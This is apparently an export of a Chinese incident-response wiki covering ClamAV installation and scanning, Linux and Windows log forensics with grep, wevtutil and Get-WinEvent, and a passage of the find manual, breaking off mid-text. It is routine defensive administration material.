Clamav是高度跨平台的。开发团队无法测试每一个操作系统，所以我们选择使用两种最流行的桌面操作系统的最新长期支持(LTS)版本来测试ClamAV。我们定期测试的操作系统包括:\nGNU/Linux\nAlpine 3.11 (64bit) Ubuntu 18.04 (64bit, 32bit) 20.04 (64bit) Debian 9 (64bit, 32bit) 10 (64bit, 32bit) CentOS 7 (64bit, 32bit) 8 (64bit) Fedora 30 (64bit) 31 (64bit) UNIX\nFreeBSD 11 (64bit) 12 (64bit) macOS 10.13 (High Sierra) 10.15 (Catalina) Windows\n7 (64bit, 32bit) 10 (64bit, 32bit) 推荐系统 以下推荐的最低系统要求适用于使用思科提供的标准ClamAV特征库的ClamScan或ClamD应用程序。\nClamAV的最低推荐配置:\n最低内存配置： FreeBSD and Linux server edition: 2 GiB+ Linux non-server edition: 2 GiB+ Windows 7 \u0026 10 32-bit: 2 GiB+ Windows 7 \u0026 10 64-bit: 3 GiB+ macOS: 3 GiB+ 最小CPU需求：1 CPU at 2.0 Ghz+ 最低硬盘需求：5G软件支持 clamav-announce@lists.clamav.net\ninfo about new versions, moderated.\nSubscribers are not allowed to post to this mailing list.\nclamav-users@lists.clamav.net\nuser questions\nclamav-devel@lists.clamav.net\ntechnical discussions\nclamav-virusdb@lists.clamav.net\ndatabase update announcements, moderated\nclamav-binary@lists.clamav.net\ndiscussion and announcements for package maintainers\n安装方式 windows安装方式 下载zip安装包安装\nhttps://www.clamav.net/downloads#otherversions\n官方docker镜像安装方式 dockerhub clamav docker地址\nhttps://hub.docker.com/r/clamav/clamav\nMAC安装 brew install clamav\n源码安装方式 Unix/Linux/Mac Instructions\nWindows Instructions\nclamAV安装位置 ClamAV安装包有多种不同的版本：\n数据库和应用配置地址可能存在很大差距：\n默认源码安装在/usr/local, with:\napplications in /usr/local/bin daemons in /usr/local/sbin libraries in /usr/local/lib headers in /usr/local/include configs in /usr/local/etc/ (or /usr/local/etc/clamav/ for v0.104+) databases in /usr/local/share/clamav/ linux安装包安装在/usr, with:\napplications in /usr/bin daemons in /usr/sbin libraries in /usr/lib headers in /usr/include configs in /etc/clamav databases in /var/lib/clamav 其他情况以及安装问题可以尝试在下列手册中查找解答https://docs.clamav.net/manual/Installing/Packages.html\n基本使用 官方使用文档参见https://docs.clamav.net/\n安装方式一：\n1、安装zlib： wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gz cd zlib-1.2.7 #安装一下gcc编译环境： yum install gcc CFLAGS=\"-O3 -fPIC\" ./configure --prefix= /usr/local/zlib/ make \u0026\u0026 make install 2、添加用户组clamav和组成员clamav： groupadd clamav useradd -g clamav -s /bin/false -c \"Clam AntiVirus\" clamav 3、安装Clamav tar –zxvf clamav-0.97.6.tar.gz cd clamav-0.97.6 ./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib make make install 4、配置Clamav mkdir /opt/clamav/logs mkdir /opt/clamav/updata touch /opt/clamav/logs/freshclam.log touch /opt/clamav/logs/clamd.log cd /opt/clamav/logs chown clamav:clamav clamd.log chown clamav:clamav freshclam.log 5、ClamAV 使用： /opt/clamav/bin/freshclam 升级病毒库 ./clamscan –h 查看相应的帮助信息 ./clamscan -r /home 扫描所有用户的主目录就使用 ./clamscan -r --bell -i /bin 扫描bin目录并且显示有问题的文件的扫描结果 安装方式二： #安装 yum install -y clamav #更新病毒库 freshclam #扫描方法 clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log #扫描并杀毒 clamscan -r --remove /usr/bin/bsd-port clamscan -r --remove /usr/bin/ clamscan -r --remove /usr/local/zabbix/sbin #查看日志发现 cat /root/usrclamav.log |grep FOUNDWindows杀软 杀软比较多不再赘述\n火绒 360 ",
    "description": "",
    "tags": null,
    "title": "linux下病毒查杀",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%97%85%E6%AF%92%E6%9F%A5%E6%9D%80%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "linux下系统日志查询 这里仅做取证方式介绍\n/var/log/* 基本命令 日志默认存放位置：/var/log/\n查看日志配置情况：more /etc/rsyslog.conf\n日志文件 说明 /var/log/cron 记录了系统定时任务相关的日志 /var/log/cups 记录打印信息的日志 /var/log/dmesg 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 /var/log/mailog 记录邮件信息 /var/log/message 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 /var/log/btmp 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看 /var/log/wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看 /var/log/utmp 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询 /var/log/secure 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 /var/log/httpd/access.log； apache日志 /var/log/apache/access.log； apache日志 /var/log/apache2/access.log； apache日志 /var/log/httpdaccess.log apache日志 /usr/local/nginx/logs nginx日志 /var/log/messages ftp日志/etc/vsftp/vsftp.conf 常用命令 1、定位有多少IP在爆破主机的root帐号： grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破： grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c 爆破用户名字典是什么？ grep \"Failed password\" /var/log/secure|perl -e 'while($_=\u003c\u003e){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 登录成功的日期、用户名、IP： grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志： Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4、删除用户kali日志： Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5、su切换用户： Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo授权执行: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r nowwindows下系统日志查询 首先众所周知常见的查询日志的方法：电脑-右键管理-Windows日志，这里不再赘述，这种方法查询和导出都非常缓慢，应急场景不推荐。至少你可以通过复制%SystemRoot%\\Logs；%SystemRoot%\\System32\\winevt。两个整文件基本完成系统日志取证工作，这里我们尝试采用其他方式目的为了提高现场的效率。\n%SystemRoot%\\Logs # 系统日志\n%SystemRoot%\\System32\\winevt # 系统日志\n%SystemDrive%\\inetpub\\logs\\LogFiles；# IIS日志\n%SystemRoot%\\System32\\LogFiles\\W3SVC1； # IIS日志\n%SystemRoot%\\System32\\LogFiles\\HTTPERR； # IIS日志\n%SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1； # IIS日志\nWevtutil（cmd） 基本命令 cmd 输入：Wevtutil /?\n用于检索有关事件日志和发布者的信息， 安装和卸载事件清单，运行查询以及导出、存档和清除日志。 用法: 你可以使用短(如 ep /uni)或长(如 enum-publishers /unicode)形式的命令和选项名称。 命令、选项和选项值不区分大小写。 变量均使用大写形式。 wevtutil COMMAND [ARGUMENT [ARGUMENT] ...] [/OPTION:VALUE [/OPTION:VALUE] ...] 命令: el | enum-logs 列出日志名称。 gl | get-log 获取日志配置信息。 sl | set-log 修改日志配置。 ep | enum-publishers 列出事件发布者。 gp | get-publisher 获取发布者配置信息。 im | install-manifest 从清单中安装事件发布者和日志。 um | uninstall-manifest 从清单中卸载事件发布者和日志。 qe | query-events 从日志或日志文件中查询事件。 gli | get-log-info 获取日志状态信息。 epl | export-log 导出日志。 al | archive-log 存档导出的日志。 cl | clear-log 清除日志。 常用选项: /{r | remote}:VALUE 如果指定，则在远程计算机上运行该命令。VALUE 是远程计算机名称。 /im 和 /um 选项不支持远程操作。 /{u | username}:VALUE 指定一个不同的用户以登录到远程计算机。 VALUE 是 domain\\user 或 user 形式的用户名。只有在指定 /r 选项时才适用。 /{p | password}:VALUE 指定的用户密码。如果未指定， 或者 VALUE 为 \"*\"，则会提示用户输入密码。 只有在指定 /u 选项时才适用。 /{a | authentication}:[Default|Negotiate|Kerberos|NTLM] 用于连接到远程计算机的身份验证类型。默认值为 Negotiate。 /{uni | unicode}:[true|false] 使用 Unicode 显示输出。如果为 true，则使用 Unicode 显示输出。 要了解特定命令的详细信息，请键入以下命令: wevtutil COMMAND /?语法：\nwevtutil [{el | enum-logs}] [{gl | get-log} \u003cLogname\u003e [/f:\u003cFormat\u003e]] [{sl | set-log} \u003cLogname\u003e [/e:\u003cEnabled\u003e] [/i:\u003cIsolation\u003e] [/lfn:\u003cLogpath\u003e] [/rt:\u003cRetention\u003e] [/ab:\u003cAuto\u003e] [/ms:\u003cMaxSize\u003e] [/l:\u003cLevel\u003e] [/k:\u003cKeywords\u003e] [/ca:\u003cChannel\u003e] [/c:\u003cConfig\u003e]] [{ep | enum-publishers}] [{gp | get-publisher} \u003cPublishername\u003e [/ge:\u003cMetadata\u003e] [/gm:\u003cMessage\u003e] [/f:\u003cFormat\u003e]] [{im | install-manifest} \u003cManifest\u003e] [{um | uninstall-manifest} \u003cManifest\u003e] [{qe | query-events} \u003cPath\u003e [/lf:\u003cLogfile\u003e] [/sq:\u003cStructquery\u003e] [/q:\u003cQuery\u003e] [/bm:\u003cBookmark\u003e] [/sbm:\u003cSavebm\u003e] [/rd:\u003cDirection\u003e] [/f:\u003cFormat\u003e] [/l:\u003cLocale\u003e] [/c:\u003cCount\u003e] [/e:\u003cElement\u003e]] [{gli | get-loginfo} \u003cLogname\u003e [/lf:\u003cLogfile\u003e]] [{epl | export-log} \u003cPath\u003e \u003cExportfile\u003e [/lf:\u003cLogfile\u003e] [/sq:\u003cStructquery\u003e] [/q:\u003cQuery\u003e] [/ow:\u003cOverwrite\u003e]] [{al | archive-log} \u003cLogpath\u003e [/l:\u003cLocale\u003e]] [{cl | clear-log} \u003cLogname\u003e [/bu:\u003cBackup\u003e]] [/r:\u003cRemote\u003e] [/u:\u003cUsername\u003e] [/p:\u003cPassword\u003e] [/a:\u003cAuth\u003e] [/uni:\u003cUnicode\u003e]参数：\n参数 说明 {el | 枚举日志} 显示所有日志的名称。 {gl | 获取日志} [/f： ] 显示指定日志的配置信息，其中包括日志是否已启用、日志的当前最大大小限制以及日志所存储到文件的路径。 {sl | set 日志} [/e： ][/i： ][/lfn： ][/rt： ][/ab： ][/ms： ][/l： ][/k： ][/ca： ][/c： ] 修改指定日志的配置。 {ep | enum-发布服务器} 显示本地计算机上的事件发布者。 {gp | get-publisher} [/ge： ][/gm： ][/f： ]] 显示指定事件发布者的配置信息。 {im | 安装清单} 从清单安装事件发布者和日志。 有关事件清单和使用此参数的详细信息，请参阅 Microsoft 开发人员网络上的 Windows 事件日志 SDK (MSDN) 网站 (https://msdn.microsoft.com) 。 {um | 卸载-清单} 从清单中卸载所有发布服务器和日志。 有关事件清单和使用此参数的详细信息，请参阅 Microsoft 开发人员网络上的 Windows 事件日志 SDK (MSDN) 网站 (https://msdn.microsoft.com) 。 {qe | } 个查询[/lf： ][/sq： ][/q： ][/bm： ][/sbm： ][/rd： ][/f： ][/l： ][/c： ][/e： ] 从事件日志、日志文件或使用结构化查询读取事件。 默认情况下，提供的日志名称 。 但是，如果使用 /lf 选项，则 必须是日志文件的路径。 如果使用 /sq 参数，则 必须是包含结构化查询的文件的路径。 {gli | loginfo} [/lf： ] 显示有关事件日志或日志文件的状态信息。 如果使用 /lf 选项， 则是日志文件的路径。 可以运行 wevtutil el 获取日志名称列表。 {epl | 导出日志} [/lf： ][/sq： ][/q： ][/ow： ] 从事件日志、日志文件或使用结构化查询从事件日志中导出事件到指定的文件。 默认情况下，提供的日志名称 。 但是，如果使用 /lf 选项，则 必须是日志文件的路径。 如果使用 /sq 选项，则 必须是包含结构化查询的文件的路径。 是文件的路径，导出的事件将存储在该文件中。 {al | 存档-log} [/l： ] 以自包含格式存档指定的日志文件。 将创建一个子目录，其中包含区域设置的名称，并将所有特定于区域设置的信息保存在该子目录中。 通过运行 wevtutil al 创建目录和日志文件之后，无论是否安装了发布服务器，都可以读取文件中的事件。 {cl | clear log} [/bu： ] 从指定的事件日志中清除事件。 可以使用 /bu 选项来备份已清除的事件。 选项：\n选项 选项 说明 /f： 指定输出应为 XML 或文本格式。 如果 为 XML，则输出以 XML 格式显示。 如果 为 Text，则输出在没有 XML 标记的情况下显示。 默认值为 Text。 /e: 启用或禁用日志。 可以是 true 或 false。 /i： 设置日志隔离模式。 可以是系统、应用程序或自定义。 日志的隔离模式确定日志是否与同一隔离类中的其他日志共享会话。 如果指定系统隔离，目标日志将至少与系统日志共享写入权限。 如果指定应用程序隔离，目标日志将至少与应用程序日志共享写入权限。 如果指定自定义隔离，还必须使用 /ca 选项提供安全描述符。 /lfn： 定义日志文件名。 是事件日志服务存储此日志的事件的文件的完整路径。 /rt： 设置日志保留模式。 可以是 true 或 false。 日志保留模式确定日志达到其最大大小时事件日志服务的行为。 如果事件日志达到其最大大小，并且日志保留模式为 true，则保留现有事件并丢弃传入事件。 如果日志保留模式为 false，则传入事件将覆盖日志中最早的事件。 /ab： 指定日志自动备份策略。 可以是 true 或 false。 如果此值为 true，则日志在达到最大大小时将自动备份。 如果此值为 true，则 (/rt 选项指定的保留期) 也必须设置为 true。 /ms： 设置日志的最大大小（以字节为单位）。 最小日志大小1048576字节 (1024KB) 日志文件始终为 64KB 的倍数，因此输入的值将相应地舍入。 /l: 定义日志的级别筛选器。 可以是任何有效的级别值。 此选项仅适用于具有专用会话的日志。 可以通过将 设置为 0 来删除级别 筛选器。 /k： 指定日志的关键字筛选器。 可以是任何有效的 64 位关键字掩码。 此选项仅适用于具有专用会话的日志。 /ca： 设置事件日志的访问权限。 是一个安全描述符，它使用安全描述符定义语言 (SDDL) 。 有关 SDDL 格式的信息，请参阅 Microsoft 开发人员网络 (MSDN) 网站 https://msdn.microsoft.com () 。 /c： 指定配置文件的路径。 此选项将导致从 中定义的配置文件读取日志属性 。 如果使用此选项，则不得指定 参数。 日志名称会从配置文件中读取。 /ge： 获取此发布服务器可以引发的事件的元数据信息。 可以是 true 或 false。 /gm： 显示实际消息，而不是数字消息 ID。 可以是 true 或 false。 /lf： 指定应从日志或日志文件中读取事件。 可以是 true 或 false。 如果为 true，则命令的参数是日志文件的路径。 /sq： 指定应该使用结构化查询获取事件。 可以是 true 或 false。 如果为 true，则 是包含结构化查询的文件的路径。 /q： 定义 XPath 查询以筛选读取或导出的事件。 如果未指定此选项，将返回或导出所有事件。 当 /sq 为 true 时 ，此选项 不可用。 /bm： 指定包含上一查询中的书签的文件的路径。 /sbm： 指定用于保存此查询书签的文件的路径。 文件扩展名应.xml。 /rd： 指定事件的读取方向。 可以是 true 或 false。 如果为 true，则首先返回最近的事件。 /l: 定义用于打印特定区域设置中的事件文本区域设置字符串。 仅在使用 /f 选项以文本格式打印事件时可用。 /c： 设置要读取的最大事件数。 /e: 在 XML 中显示事件时包含根元素。 是根元素中需要字符串。 例如 ，/e：root 将导致 XML 包含根元素对 。 /ow： 指定应覆盖导出文件。 可以是 true 或 false。 如果为 true，并且 中指定的导出文件 已存在，将覆盖该文件而不进行确认。 /bu： 指定存储已清除事件的文件的路径。 在备份文件的名称中包括 .evtx 扩展名。 /r： 在远程计算机上运行 命令。 是远程计算机的名称。 im 和 um 参数不支持远程操作。 /u： 指定要登录到远程计算机的不同用户。 是域\\用户或用户形式的用户名。 此选项仅在指定了 /r 选项时适用。 /p： 指定用户的密码。 如果使用 /u 选项，并且未指定此选项或 为 ，则系统会提示用户输入 密码。此选项仅在指定 * * /u * 选项时适用。 /a： 定义用于连接到远程计算机的身份验证类型。 可以是 Default、Negotiate、Kerberos 或 NTLM。 默认值为 Negotiate。 /uni： 以 Unicode 显示输出。 可以是 true 或 false。 如果 为 true，则输出为 Unicode。 官方示例：\n列出所有日志的名称：\nwevtutil el以 XML 格式显示有关本地计算机上的系统日志的配置信息：\nwevtutil gl System /f:xml使用配置文件设置事件日志属性 (参阅) 的配置文件示例的备注：\nwevtutil sl /c:config.xml显示有关 Microsoft Windows-Eventlog 事件发布者的信息，包括有关发布者可以引发的事件的元数据：\nwevtutil gp Microsoft-Windows-Eventlog /ge:true从 myManifest.xml 清单文件中安装发布服务器和日志：\nwevtutil im myManifest.xml从 myManifest.xml 清单文件卸载发布服务器和日志：\nwevtutil um myManifest.xml以文本格式显示应用程序日志中三个最近的事件：\nwevtutil qe Application /c:3 /rd:true /f:text显示应用程序日志的状态：\nwevtutil gli Application将事件从系统日志导出到 C:\\backup\\system0506.evtx：\nwevtutil epl System C:\\backup\\system0506.evtx将所有事件保存到 C:\\admin\\backups\\a10306.evtx 后，请清除应用程序日志中的所有事件：\nwevtutil cl Application /bu:C:\\admin\\backups\\a10306.evtx参考：https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/wevtutil\n常用命令 wevtutil el # 列出已注册的事件日志 wevtutil epl System C:\\System_log.evtx # 将System日志导出到文件C:\\System_log.evtx wevtutil epl Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational C:\\rdp_log.evtx # 导出远程桌面日志到C:\\rdp_log.evtx wevtutil qe Application /q:\"Event/System/EventID=1704\" /c:100 /f:text # 在应用日志中的最后100个条目中搜索ID为1704的事件 Get-winEvent（ps） Get-WinEvent 用于替代运行 Windows Vista 及更高版本的 Windows 的计算机上的 Get-EventLog cmdlet。Get-EventLog 只获取传统事件日志中的事件。Windows PowerShell 2.0 为 Windows Vista 以前的系统保留了 Get-EventLog。\n基本命令 Get-WinEvent [-LogName] \u003cstring[]\u003e [-ComputerName \u003cstring\u003e] [-Credential \u003cPSCredential\u003e] [-FilterXPath \u003cstring\u003e] [-Force \u003cswitch\u003e] [-MaxEvents \u003cint64\u003e] [-Oldest] [\u003cCommonParameters\u003e] Get-WinEvent [-Path] \u003cstring[]\u003e [-ComputerName \u003cstring\u003e] [-Credential \u003cPSCredential\u003e] [-FilterXPath \u003cstring\u003e] [-Force \u003cswitch\u003e] [-MaxEvents \u003cint64\u003e] [-Oldest] [\u003cCommonParameters\u003e] Get-WinEvent [-ProviderName] \u003cstring[]\u003e [-ComputerName \u003cstring\u003e] [-Credential \u003cPSCredential\u003e] [-FilterXPath \u003cstring\u003e] [-Force \u003cswitch\u003e] [-MaxEvents \u003cint64\u003e] [-Oldest] [\u003cCommonParameters\u003e] Get-WinEvent -FilterHashTable \u003cHashtable[]\u003e [-ComputerName \u003cstring\u003e] [-Credential \u003cPSCredential\u003e] [-Force \u003cswitch\u003e] [-MaxEvents \u003cint64\u003e] [-Oldest] [\u003cCommonParameters\u003e] Get-WinEvent [-ListLog] \u003cstring[]\u003e [-ComputerName \u003cstring\u003e] [-Credential \u003cPSCredential\u003e] [\u003cCommonParameters\u003e] Get-WinEvent [-ListProvider] \u003cstring[]\u003e [-ComputerName \u003cstring\u003e] [-Credential \u003cPSCredential\u003e] [\u003cCommonParameters\u003e] Get-WinEvent -FilterXml \u003cXmlDocument\u003e [-ComputerName \u003cstring\u003e] [-Credential \u003cPSCredential\u003e] [-Force \u003cswitch\u003e] [-MaxEvents \u003cint64\u003e] [-Oldest] [\u003cCommonParameters\u003e]Get-WinEvent cmdlet 从包括传统日志（例如系统日志和应用程序日志）在内的事件日志和 Windows Vista 中引入的新 Windows 事件日志技术生成的事件日志中获取事件。它还获取 Windows 事件跟踪 (ETW) 生成的日志文件中的事件。\n如果没有参数，则 Get-WinEvent 命令获取计算机上的所有事件日志中的所有事件。若要中断此命令，请按 Ctrl+C。\nGet-WinEvent 还列出事件日志和事件日志提供程序。可以从选定日志中或者从选定事件提供程序生成的日志中获取事件。并且可以将来自多个源的事件组合在一个命令中。Get-WinEvent 允许使用 XPath 查询、结构化 XML 查询和简化的哈希表查询来筛选事件。\n示例：\n# 获取 Server01、Server02 和 Server03 计算机上的 Windows PowerShell 事件日志的对象。因为 ComputerName 参数只接受一个值，所以第二个命令使用 Foreach 关键字。 $s = \"Server01\", \"Server02\", \"Server03\" foreach ($server in $s) {$server; get-winevent -listlog \"Windows PowerShell\" -computername $server} # 显示计算机用用程序日志中所有程序 (get-winevent -listlog Application).providernames # 名称包含单词“policy”的事件日志提供程序 get-winevent -listprovider *policy* # Microsoft-Windows-GroupPolicy 事件提供程序生成的事件 ID 以及事件说明 (get-winevent -listprovider microsoft-windows-grouppolicy).events | format-table id, description -auto # 统计日志中每个事件 $events = get-winevent -logname \"Windows PowerShell\" $events.count # 统计事件数 $events | group-object id -noelement | sort-object count -desc # 倒序排列告警编号和统计数目 $events | group-object leveldisplayname -noelement # 统计种类 # 获取计算机上的所有事件日志中以及 Microsoft-Windows-Kernel-WHEA 事件日志中名称包括“disk”的错误事件。 get-winevent -logname *disk*, Microsoft-Windows-Kernel-WHEA # 从测试目录中获取事件日志 get-winevent -path 'c:\\ps-test\\Windows PowerShell.evtx' # 获取日志中 100 个最旧的事件 get-winevent -path 'c:\\tracing\\tracelog.etl' -maxevents 100 -oldest get-winevent -path 'c:\\tracing\\tracelog.etl' -oldest | sort-object -property timecreated -desc | select-object -first 100 get-winevent -logname \"Windows PowerShell\" -maxevents 100 -oldest # 获取两个日志中100条最老的安全事件 get-winevent -logname \"Windows PowerShell\",\"System\" -maxevents 100 -oldest # 获取24小时前的日志 C:\\PS\u003e# Use the Where-Object cmdlet C:\\PS\u003e $yesterday = (get-date) - (new-timespan -day 1) C:\\PS\u003e get-winevent -logname \"Windows PowerShell\" | where {$_.timecreated -ge $yesterday} # Uses FilterHashTable C:\\PS\u003e $yesterday = (get-date) - (new-timespan -day 1) C:\\PS\u003e get-winevent -FilterHashTable @{LogName='Windows PowerShell'; Level=3; StartTime=$yesterday} # Use FilterXML C:\\PS\u003e get-winevent -FilterXML \"\u003cQueryList\u003e\u003cQuery\u003e\u003cSelect Path='Windows PowerShell'\u003e*[System[Level=3 and TimeCreated[timediff(@SystemTime) \u003c= 86400000]]]\u003c/Select\u003e\u003c/Query\u003e\u003c/QueryList\u003e\" # Use FilterXPath C:\\PS\u003e get-winevent -LogName \"Windows Powershell\" -FilterXPath \"*[System[Level=3 and TimeCreated[timediff(@SystemTime) \u003c= 86400000]]]\" # 获取两天前日期的日志 C:\\PS\u003e$date = (get-date).AddDays(-2) C:\\PS\u003e $events = get-winevent -FilterHashTable @{ logname = \"Microsoft-Windows-Diagnostics-Performance/Operational\"; StartTime = $date; ID = 100 } # 使用筛选器哈希表来查找上周发生的 Internet Explorer 应用程序错误 C:\\PS\u003e$starttime = (get-date).adddays(-7) C:\\PS\u003e $ie-error = Get-WinEvent -FilterHashtable @{logname=\"application\"; providername=\"Application Error\"; data=\"iexplore.exe\"; starttime=$starttime}常用命令 get-winevent -listlog * # 此命令获取本地计算机上的所有日志。 # 日志按 Get-WinEvent 获取它们的顺序列出。通常首先检索传统日志，然后检索新的 Windows 事件日志。 # 因为通常有一百多个事件日志，所以此参数需要日志名称或名称模式。若要获取所有日志，请使用 *。 get-winevent -listlog Setup | format-list -property * # 这些命令获取表示本地计算机上的传统系统日志的对象。该对象包括有关日志的有用信息，其中包括日志大小、事件日志提供程序、文件路径以及是否已启用日志。 get-winevent -listlog * -computername Server01| where {$_.recordcount} # 此命令只获取 Server01 计算机上含有事件的事件日志。许多日志可能是空的。 # 此命令使用 Get-WinEvent 在您使用 ListLog 参数时返回的 EventLogConfiguration 对象的 RecordCount 属性。参考：\nhttps://docs.microsoft.com/en-us/previous-versions/dd367894(v=technet.10)?redirectedfrom=MSDN\nhttps://blog.csdn.net/weixin_44591106/article/details/98592519\n",
    "description": "",
    "tags": null,
    "title": "系统日志查询",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "在日常应急下，我们除了针对重要数据检查，还会针对一些重点文件目录进行检查，相关目录或多或少受到黑客攻击的影响留下了痕迹，对相关文件的检查和分析有助于我们还原整个攻击链。本文则注重相关目录基本的实用查看查询方式技巧展开。\nLinux下常见重点文件目录检查 临时目录检查 /tmp\n查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性\n最近访问的文件 find 基本用法 为了方便查阅这里放一下汉化版find的man手册\n总览 find [path...] [expression] 描述 这个文档是GNU版本 find 命令的使用手册。 find 搜索目录树上的每一个文件名，它从左至右运算给定的表达式，按照优先规则(见运 算符OPERATORS一节)进行匹配，直到得出结果（左边运算在 '与' 操作中得出假， 在'或' 操作中得出真），然后 find 移向下一个文件名。 第一个以 '-' , '(' , ')' , ',' 或 '!' 这些字符起始的参数是表达式的开始; 在它之前的任何参数是要搜索的路径，在它之后的任何参数都是表达式的余下部分。 如果没有路径参数，缺省用当前目录。如果没有表达式，缺省表达式 用 '-print'. 当所有文件都成功处理时 find 退出并返回状态值0。如果发生错误则返回一个大于0的值。 表达式 表达式是由选项(选项总是影响所有的操作, 而不仅仅是一个指定的文件的处 理, 而且总是返回真值)，测试(测试返回一个真值或一个假值)，还有动 作(动作有side effects, 返回一个真值或假值) 组成。它们都以运算符分开.忽 略运算符的时候，默认使用 -and 连接. 如果表达式没有包含 -prune 以外的动 作，当表达式为真时会执行 -print 动作。 选项 所有的选项都总是返回真值，它们总会被执行，除非放在表达式中执行不到的地方。 因此，清楚起见，最好把它们放在表达式的开头部分。 -daystart 从当日起始时开始而不是从24小时之前，计算时间(for -amin, -atime, -cmin, -ctime, -mmin, and -mtime)。 -depth 先处理目录的内容再处理目录本身。 -follow 不检索符号链接。隐含了 -noleaf。 -help, --help 列出 find 的命令行用法的概要，然后退出。 -maxdepth levels 进入命令行参数指定的目录下层目录时，最深不超过levels(一个非负整数) 层。`-maxdepth 0' 意味着只在命令行参数指定的目录中执行测试和动作。 -mindepth levels 不在levels(一个非负整数)层之内执行任何测试和动作。`-mindepth 1'意 味着处理所有的文件，除了命令行参数指定的目录中的文件。 -mount 不进入处于其它文件系统之上的目录。可以用-xdev代替，从而和一些其他版本的 find 兼容。 -noleaf 不为“目录中子目录数量比硬连接数少2”这种假设做优化。这个选项在搜索那些不遵 循UNIX文件系统链接约定的文件系统时用，比如CD-ROM,MS-DOS文件系统或AFS卷的 加载点。在普通的UNIX文件系统中,每个目录至少有两个硬连接,它的名字和它 的 '.' 条目。另外，它的子目录(假如有)还会各有一个 '..' 链接到它。在 find 检索一个目录时，发现子目录数比它的连接数少二时，它就知道目录中的其他条目 并非目录(而是目录树中的叶(`leaf')节点)。除非需要检索的是这个叶节点，否则 没必要去处理它。这样可以带来很大的搜索速度提升。 -version, --version 打印find的版本号然后退出。 -xdev 不进入处于其他文件系统之上的目录。 测试TESTS 数字参数可以这样给出： +n 是比 n 大， -n 是比 n 小， n 正好是 n 。 -amin n 对文件的最近一次访问是在 n 分钟之前。 -anewer file 对文件的最近一次访问比 file 修改时间要晚。如果命令行中 -follow 在 -anewer 之前，(也只有在这种情况下) -anewer 会受 -follow 的影响。 -atime n 对文件的最近一次访问是在 n*24 小时之前。 -cmin n 对文件状态的最近一次修改是在 n 分钟之前。 -cnewer file 对文件状态的最近一次修改比 file 修改时间要晚。如果命令行中 -follow 在 -cnewer 之前，(也只有在这种情况下) -cnewer 会受 -follow 的影响。 -ctime n 对文件状态的最近一次修改是在 n*24 小时之前。 -empty 文件是空的普通文件或者空目录。 -false 总是false。 -fstype type 文件处于 type 类型的文件系统之上。有效的文件系统类型在不同版本的Unix中是不同的；一些Unix中的不完全的文件系统类型列表是这样：ufs, 4.2, 4.3, nfs, tmp, mfs, S51K, S52K. 你可以用 